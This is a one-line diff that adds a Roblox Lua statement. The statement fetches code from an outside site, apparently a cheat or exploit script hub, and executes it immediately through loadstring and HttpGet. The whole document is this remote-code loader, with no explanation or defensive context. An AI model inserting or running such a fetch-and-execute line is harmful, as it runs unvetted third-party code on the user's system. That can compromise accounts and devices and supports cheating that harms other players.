@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://solixhub.com/loader"))()
